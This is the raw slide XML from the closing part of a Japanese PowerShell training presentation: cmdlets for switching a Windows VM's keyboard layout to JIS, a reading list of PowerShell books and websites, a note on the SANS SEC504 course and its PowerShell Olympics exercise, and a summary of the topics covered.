              <a:t>" -Value 7</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2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Set-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ItemProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Path $Path -Name "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>OverrideKeyboardSubtype</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>" -Value 2</a:t>
            </a:r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21109DB4-9AD6-4C13-89EA-21ACC687B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20" y="961505"/>
            <a:ext cx="6768752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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Set-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>WinUserLanguageList</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRP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F4000820-EFE7-000E-F9B3-926C115FE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98" y="1416690"/>
            <a:ext cx="10440989" cy="113107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SANS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コースで提供される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Windows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の仮想マシンは米国英語設定で、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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>キー配列も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ASCII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配列になっている。</a:t>
            </a:r>
          </a:p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GUI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で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JIS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配列にするのが面倒であれば、以下の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Cmdlet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群が使える。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3644489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2EBB9C79-05F2-0AA2-2E24-936C332C0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学習案内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9A5A075-CD1E-AA17-12B7-D23D1A1507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31C19E3-6052-67A4-78B1-743C0C3FFA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56</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{03680378-F7CF-C2D8-F3DC-1192F4547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7868" y="4941168"/>
            <a:ext cx="6407830" cy="126014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numCol="3" spcCol="288000">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/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基本事項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プロセス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ネットワーク</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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ファイル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永続化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イベントログ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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環境整備</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>学習案内</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" b="1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まとめ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" dirty="0">
              <a:latin typeface="+mn-ea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796684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20FA38DE-92CF-29F5-487E-1349DE9B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学習案内 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>読みもの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4A0B804-FF30-8D8B-551A-3F3266C1E7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007CADC-22EF-F14B-E6BF-C4FFA48E0A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57</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4E46DCA0-1DDA-194A-E4C8-61E7DE8FE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20" y="935432"/>
            <a:ext cx="4788532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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍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書籍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3F822119-E44C-70D1-F66D-63C350044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992" y="1339458"/>
            <a:ext cx="10440989" cy="214674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  <a:t>Travis Plunk, James Petty, Tyler Leonhardt, Don Jones, Jeffery Hicks</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2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2200" i="1" dirty="0">
                <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Learn PowerShell in a Month of Lunches, Fourth Edition</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" i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  <a:t>Manning Publications, March 2022, 360 pages</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" alt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  <a:t>Miriam C. Wiesner</a:t>
            </a:r>
            <a:b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2200" i="1" dirty="0">
                <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>PowerShell Automation and Scripting for Cybersecurity</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" i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2200" dirty="0" err="1">
                <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Packt</a:t>
            </a:r>
            <a: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  <a:t> Publishing, August 2023, 572 pages </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" alt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C67D9107-8C11-B52A-FBE3-66A640133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20" y="3664182"/>
            <a:ext cx="4788532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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍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ウェブサイト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613FBEBA-56C1-533D-B91D-C4A9E323A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992" y="4073294"/>
            <a:ext cx="10719620" cy="2416046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  <a:t>Microsoft Learn: PowerShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" alt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  <a:t>101</a:t>
            </a:r>
            <a:b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  <a:t>https://learn.microsoft.com/ja-jp/powershell/scripting/learn/ps101/00-introduction</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" alt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  <a:t>Joshua Wright: Month of PowerShell</a:t>
            </a:r>
            <a:b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  <a:t>https://www.sans.org/blog/getting-started-with-powershell/</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" alt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村嶋修一</a:t>
            </a:r>
            <a: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  <a:t>: Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" alt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にまつわる </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>e.t.c</a:t>
            </a:r>
            <a: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b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  <a:t>https://www.vwnet.jp/Windows/etc.asp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ja-JP" altLang="en-US" sz="1000" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea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00989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60744B-54EA-EA9A-B8FE-E0F119876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学習案内 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>レファレンス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59CF0B0-B7E1-7876-BC44-DC78FA92AB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F6AB302-DCE9-E091-5C6A-21FBBF90BD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58</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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7E663D6F-8E6D-0597-FF2A-4389EB247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20" y="935432"/>
            <a:ext cx="4788532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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍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書籍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A93296F6-EA94-7002-2FA4-A1A3FECDC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992" y="1339458"/>
            <a:ext cx="10440989" cy="2716128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100" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>牟田口大介</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2100" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>『</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2100" dirty="0">
                <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Windows PowerShell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2100" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>ポケットリファレンス</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2100" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>』</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2100" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>改訂新版</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2100" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2100" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>技術評論社</a:t>
            </a:r>
            <a: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  <a:t>, March 2013,  592 pages</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" alt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  <a:t>Adam Bertram: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" i="1" dirty="0">
                <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>PowerShell for Sysadmins</a:t>
            </a:r>
            <a:b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  <a:t>No Starch Press, February 2020, 320 pages</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US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  <a:t>Chris Dent: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" i="1" dirty="0">
                <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Mastering PowerShell Scripting, Fourth Edition</a:t>
            </a:r>
            <a:b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2200" dirty="0" err="1">
                <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Packt</a:t>
            </a:r>
            <a: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  <a:t> Publishing, June 2021, 788 pages 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	</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="l"/>
            </a:pPr>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr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D6004B7C-B101-4D69-5090-691774A75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20" y="3743744"/>
            <a:ext cx="4788532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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍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ウェブサイト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72500CB2-7B16-8718-7B85-03B26DB1E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992" y="4191178"/>
            <a:ext cx="10440989" cy="2262158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杜甫々</a:t>
            </a:r>
            <a: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ja-JP" alt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とほほの</a:t>
            </a:r>
            <a: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  <a:t>PowerShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" alt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入門</a:t>
            </a:r>
            <a:b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  <a:t>https://www.tohoho-web.com/ex/power-shell.html</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="34290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  <a:t>Michael </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Pietroforte</a:t>
            </a:r>
            <a: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  <a:t>: 4sysops - The online community for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>SysAdmins</a:t>
            </a:r>
            <a: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  <a:t> and DevOps</a:t>
            </a:r>
            <a:b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  <a:t>https://4sysops.com/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="34290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  <a:t>Patrick </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Gruenauer</a:t>
            </a:r>
            <a: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  <a:t>: SID-500.com</a:t>
            </a:r>
            <a:b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2200" dirty="0">
                <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>https://sid-500.com/</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="252170072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60744B-54EA-EA9A-B8FE-E0F119876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学習案内 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| SEC504</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>と</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>PowerShell</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>オリンピック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59CF0B0-B7E1-7876-BC44-DC78FA92AB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F6AB302-DCE9-E091-5C6A-21FBBF90BD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59</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="図 7" descr="テキスト&#10;&#10;自動的に生成された説明">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3A01F360-6E55-EB80-2EB6-7B09A64C8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2084" y="3392996"/>
            <a:ext cx="4482912" cy="2799086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89E0741E-ED3C-221B-ED7E-86F96E8623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9855"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="874712" y="3392996"/>
            <a:ext cx="5905364" cy="2799086"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2540D878-A9F8-4323-4C6A-E6E1FF7D0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992" y="903347"/>
            <a:ext cx="10440989" cy="237757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SANS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 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SEC504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「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Hacker Tools, Techniques, and Incident Handling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」では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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>攻撃手法を系統的に理解・体験するとともに、防御側として痕跡を調査する。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="34290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副産物として、授業や演習を通じて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Bash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や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PowerShell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の技能も身につく。	</a:t>
            </a:r>
          </a:p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教材には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PowerShell Olympics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というゲーム形式の学習教材が付属している。</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Linux Olympics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とともに、楽しみながら実践的な技能習得ができる。</a:t>
            </a:r>
          </a:p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次回は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2024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年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3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月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4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日㈪～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3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月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9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日㈯に開講予定。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39529813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72078A-03DE-FD62-800F-0FFFF448A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まとめ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2B08FF6-248D-895B-D09A-C70F87BD848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CE5EF58-969A-59C8-4E1D-8CA7D85874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60</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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CDC0C03B-B96A-26DB-5364-C9BA10BED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7868" y="4941168"/>
            <a:ext cx="6407830" cy="126014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numCol="3" spcCol="288000">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/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基本事項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プロセス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ネットワーク</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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ファイル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永続化</a:t>
            </a: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イベントログ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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環境整備</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>学習案内</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="447675" indent="-447675">
              <a:lnSpc>
                <a:spcPct val="120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ja-JP" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>まとめ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" b="1" dirty="0">
              <a:latin typeface="+mn-ea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8540829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A28B1F17-9633-A725-998F-DB22F4EBD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まとめ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4651DD5-2177-9ED4-B87A-74375AA32A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435318D-D147-FD26-A2F6-028A4D3701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61</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E714E384-C911-84B9-4DEF-886E4CDBD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20" y="935432"/>
            <a:ext cx="4788532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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍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やったこと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CB60F560-78AD-875B-102F-08D822E75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363" y="935432"/>
            <a:ext cx="4788532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900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍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やり残したこと</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="24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EAE65CB4-9D91-82B8-DE04-E88009AF9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1142" y="1359053"/>
            <a:ext cx="4864557" cy="487825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システム運用に関する話題</a:t>
            </a:r>
          </a:p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ジョブ、ワークフロー</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p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PowerShell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 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Remoting</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p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Active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 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Directory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管理</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1000" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="34290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スクリプティングに関する話題</a:t>
            </a:r>
          </a:p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関数</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p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エラーハンドリング</a:t>
            </a:r>
          </a:p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テスト、デバッグ</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1000" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="34290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外部環境への応用</a:t>
            </a:r>
          </a:p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Azure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、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Microsoft 365</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p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 err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>PowerCLI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（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VMware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）</a:t>
            </a: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DC153B51-D0C7-283F-ABE6-87C1D28C2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2" y="1359053"/>
            <a:ext cx="4864557" cy="487825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PowerShell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の各種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Cmdlet</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p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Get-Command, -Help, -Alias</a:t>
            </a:r>
          </a:p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Get-*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 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/ Format-* / Out-*</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="34290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オブジェクト操作（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*-Object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）</a:t>
            </a:r>
          </a:p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パイプライン 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| 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自動変数 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>$_</a:t>
            </a:r>
          </a:p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Get-Member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でプロパティ確認</a:t>
            </a:r>
          </a:p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Where-Object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で行の絞り込み</a:t>
            </a:r>
          </a:p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Select-Object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で列の絞り込み</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900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各種アーティファクト</a:t>
            </a:r>
          </a:p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en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>CimInstance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>の力を借りる</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="l"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>文字列処理よりオブジェクト化</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15767054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CBE7E670-62C8-687B-9E06-A2B9EDEF2D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© Presentation Design</a:t>
            </a:r>
            <a:endParaRPr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D98144A-2BC1-0532-5C23-9161E149AD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3508C7-2FE0-4945-9CBD-863E05F850D2}" type="slidenum">
              <a:rPr lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>62</a:t>
            </a:fld>
            <a:endParaRPr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4D24339E-157C-7B84-7EA1-B4C4388218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Thank you!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49112624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-design-2022-wide">
  <a:themeElements>
    <a:clrScheme name="presentation-design-2022">
      <a:dk1>
